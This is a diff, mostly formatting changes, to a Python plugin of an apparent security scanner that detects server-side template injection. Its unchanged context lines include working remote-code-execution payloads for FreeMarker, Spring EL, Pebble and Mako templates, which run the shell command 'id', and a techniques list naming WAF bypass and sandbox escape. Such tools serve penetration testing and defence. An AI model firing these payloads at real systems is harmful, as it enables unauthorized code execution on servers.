@@ -1,12 +1,28 @@
 # plugins/ssti_scanner.py — Cascavel 2026 Intelligence
-import requests
 import urllib.parse
 
+import requests
 
 PARAMS = [
-    "name", "template", "msg", "message", "text", "query", "search",
-    "input", "content", "title", "greeting", "email", "subject",
-    "comment", "description", "body", "value", "data", "preview",
+    "name",
+    "template",
+    "msg",
+    "message",
+    "text",
+    "query",
+    "search",
+    "input",
+    "content",
+    "title",
+    "greeting",
+    "email",
+    "subject",
+    "comment",
+    "description",
+    "body",
+    "value",
+    "data",
+    "preview",
 ]
 
 # ──────────── DETECTION PAYLOADS (math probe → engine fingerprint) ────────────
@@ -42,7 +58,15 @@ EXPLOIT_PAYLOADS = [
     ('<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}', "uid=", "FREEMARKER_EXEC"),
     ('${T(java.lang.Runtime).getRuntime().exec("id")}', "", "SPRING_EL_RCE"),
     # Pebble
-    ('{% set cmd = "id" %}{% set bytes = (1).TYPE.forName("java.lang.Runtime").methods[6].invoke(null,null).exec(cmd) %}', "", "PEBBLE_RCE"),
+    (
+        (
+            '{% set cmd = "id" %}{% set bytes = '
+            '(1).TYPE.forName("java.lang.Runtime")'
+            ".methods[6].invoke(null,null).exec(cmd) %}"
+        ),
+        "",
+        "PEBBLE_RCE",
+    ),
     # Mako
     ("<%import os;x=os.popen('id').read()%>${x}", "uid=", "MAKO_RCE"),
     # Handlebars
@@ -81,8 +105,11 @@ def _is_evaluated(resp_text, payload, indicator):
 def _build_vuln(engine, param, payload, severity="CRITICO"):
     """Constrói objeto de vulnerabilidade SSTI."""
     vuln = {
-        "tipo": "SSTI", "engine": engine, "parametro": param,
-        "payload": payload[:100], "severidade": severity,
+        "tipo": "SSTI",
+        "engine": engine,
+        "parametro": param,
+        "payload": payload[:100],
+        "severidade": severity,
     }
     if "RCE" in engine:
         vuln["descricao"] = f"Remote Code Execution via {engine.split('_')[0]}!"
@@ -159,7 +186,15 @@ def run(target, ip, open_ports, banners):
     return {
         "plugin": "ssti_scanner",
         "versao": "2026.1",
-        "tecnicas": ["detection", "exploitation", "config_leak", "waf_bypass",
-                      "polyglot", "sandbox_escape", "unicode_norm", "hex_attr"],
+        "tecnicas": [
+            "detection",
+            "exploitation",
+            "config_leak",
+            "waf_bypass",
+            "polyglot",
+            "sandbox_escape",
+            "unicode_norm",
+            "hex_attr",
+        ],
         "resultados": vulns if vulns else "Nenhum SSTI detectado",
     }
